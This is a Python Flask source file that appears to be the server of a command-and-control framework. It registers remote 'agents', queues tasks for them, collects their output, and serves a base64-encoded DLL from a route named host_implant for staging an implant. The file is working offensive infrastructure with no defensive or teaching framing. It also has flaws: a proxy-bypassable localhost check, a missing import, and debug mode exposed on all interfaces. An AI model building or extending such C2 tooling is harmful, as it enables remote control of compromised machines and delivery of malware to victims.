import json
import os
from uuid import uuid4
from flask import Flask, jsonify, request, Response
from database.scripts.schema import TableName
from database.scripts.server import DBServer
from functools import wraps
from base64 import b64encode

app = Flask(__name__)

class WebServer:
    #TODO: Security vulnerability! This can be bypassed with a proxy.
    #      Need to install a WSGI and use a rules file like .htaccess
    @staticmethod
    def localhost_only(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if request.remote_addr not in ['127.0.0.1', '::1']:
                abort(403)
            return f(*args, **kwargs)
        return decorated_function

    @app.route("/tasks/<string:uuid>", methods=["GET"])
    def list_tasks(uuid):
        db = DBServer()
        tasks = db.read_rows(TableName.TASK_TABLE.value, (uuid,))
        return jsonify(tasks)

    @app.route("/create_task/<string:uuid>", methods=["POST"])
    def create_task(uuid):
        db = DBServer()
        body = request.get_json()
        json_obj = json.loads(body)  # json_obj is a dict now
        print("Hi: ", json_obj)
        task = json_obj["task"]
        task_type = json_obj["task_type"]
        agent_uuid = json_obj["agent_uuid"]
        db.insert_row(TableName.TASK_TABLE.value, (task, task_type, agent_uuid))
        return "Task created", 200

    @app.route("/send_task_output/<string:uuid>", methods=["POST"])
    def accept_result(uuid):
        """
        Agents will submit the results of their tasks here
        """
        db = DBServer()
        body = request.get_json()
        task_id = request.get_json()["task_id"]
        agent_uuid = request.get_json()["agent_uuid"]
        result_text = request.get_json()["task_output"]
        db.insert_row(TableName.RESULT_TABLE.value, (agent_uuid, task_id, result_text))
        db.delete_row(TableName.TASK_TABLE.value, (task_id, agent_uuid))
        return "Sent output", 200

    @app.route("/get_task_output/<string:uuid>", methods=["GET"])
    def get_result(uuid):
        """
        The results of the agents tasks are reachable on this path
        """
        db = DBServer()
        results = db.read_rows(TableName.RESULT_TABLE.value, (uuid,))
        return jsonify(results)

    @app.route("/create_agent/", methods=["POST"])
    @localhost_only
    def create_agent():
        db = DBServer()
        body = request.get_json()
        json_obj = json.loads(body)
        agent_uuid = str(uuid4())
        agent_name = json_obj["name"]
        db.insert_row(TableName.AGENT_TABLE.value, (agent_uuid, agent_name))
        return agent_uuid

    @app.route("/remove_agent/", methods=["POST"])
    @localhost_only
    def remove_agent():
        db = DBServer()
        body = request.get_json()
        json_obj = json.loads(body)
        uuid = json_obj["uuid"]
        db.delete_row(TableName.AGENT_TABLE.value, (uuid,))
        return "Agent deleted"

    @app.route("/agents/", methods=["GET"])
    @localhost_only
    def list_agents():
        db = DBServer()
        agents = db.read_rows(TableName.AGENT_TABLE.value, ("%",))
        return jsonify(agents)

    @app.route("/get_agent/", methods=["POST"])
    @localhost_only
    def get_agent():
        db = DBServer()
        body = request.get_json()
        json_obj = json.loads(body)
        agent = db.read_rows(TableName.AGENT_TABLE.value, (json_obj["uuid"],))
        data = {
            "id": agent[0][0],
            "uuid": agent[0][1],
            "name": agent[0][2]
        }
        return jsonify(data)

    @app.route("/stage/", methods=["GET"])
    def host_implant():
        f = open("./std.dll", "rb").read()
        return b64encode(f)

    @app.route("/test/", methods=["GET"])
    def test():
        return "what?"

    @staticmethod
    def run():
        app.run(debug=True, port=5001, host='0.0.0.0')

